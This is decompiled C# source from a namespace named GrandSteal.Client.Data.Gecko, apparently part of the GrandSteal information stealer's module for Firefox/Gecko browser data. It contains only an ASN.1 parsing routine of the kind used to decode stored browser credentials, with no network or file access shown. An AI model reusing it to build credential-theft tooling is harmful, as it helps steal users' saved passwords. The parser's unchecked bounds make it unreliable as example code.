using System;

namespace GrandSteal.Client.Data.Gecko
{
	// Token: 0x02000022 RID: 34
	public static class Asn1Factory
	{
		// Token: 0x060000B9 RID: 185 RVA: 0x000078AC File Offset: 0x00005AAC
		public static Asn1Object Create(byte[] dataToParse)
		{
			Asn1Object asn1Object = new Asn1Object();
			for (int i = 0; i < dataToParse.Length; i++)
			{
				Asn1Type asn1Type = (Asn1Type)dataToParse[i];
				switch (asn1Type)
				{
				case Asn1Type.Integer:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.Integer,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				case Asn1Type.BitString:
				case Asn1Type.Null:
					break;
				case Asn1Type.OctetString:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.OctetString,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				case Asn1Type.ObjectIdentifier:
				{
					asn1Object.Objects.Add(new Asn1Object
					{
						ObjectType = Asn1Type.ObjectIdentifier,
						ObjectLength = (int)dataToParse[i + 1]
					});
					byte[] array = new byte[(int)dataToParse[i + 1]];
					int length = (i + 2 + (int)dataToParse[i + 1] > dataToParse.Length) ? (dataToParse.Length - (i + 2)) : ((int)dataToParse[i + 1]);
					Array.Copy(dataToParse, i + 2, array, 0, length);
					asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectData = array;
					i = i + 1 + asn1Object.Objects[asn1Object.Objects.Count - 1].ObjectLength;
					break;
				}
				default:
					if (asn1Type == Asn1Type.Sequence)
					{
						byte[] array;
						if (asn1Object.ObjectLength == 0)
						{
							asn1Object.ObjectType = Asn1Type.Sequence;
							asn1Object.ObjectLength = dataToParse.Length - (i + 2);
							array = new byte[asn1Object.ObjectLength];
						}
						else
						{
							asn1Object.Objects.Add(new Asn1Object
							{
								ObjectType = Asn1Type.Sequence,
								ObjectLength = (int)dataToParse[i + 1]
							});
							array = new byte[(int)dataToParse[i + 1]];
						}
						int arg_A9_0 = (array.Length > dataToParse.Length - (i + 2)) ? (dataToParse.Length - (i + 2)) : array.Length;
						Array.Copy(dataToParse, i + 2, array, 0, array.Length);
						asn1Object.Objects.Add(Asn1Factory.Create(array));
						i = i + 1 + (int)dataToParse[i + 1];
					}
					break;
				}
			}
			return asn1Object;
		}
	}
}
